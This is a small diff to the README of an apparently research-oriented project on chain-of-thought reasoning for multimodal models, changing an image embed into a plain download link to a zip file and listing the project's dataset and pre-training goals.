@@ -14,7 +14,7 @@ A project of multi-model dataset reinforcement and pre-training of large-scale m
 
 ## Contribution
 
-![Downloads](https://github.com/Jananzzzz/CoT-is-all-you-need/files/11635889/chain-of-thought.zip)
+[Downloads](https://github.com/Jananzzzz/CoT-is-all-you-need/files/11635889/chain-of-thought.zip)
 
 - Build a dataset that includes visual reasoning with causal chains to provide valuable resources for relevant research. 
 - Adjust the pre-training objectives during representation learning to enable the model to handle reasoning tasks. 
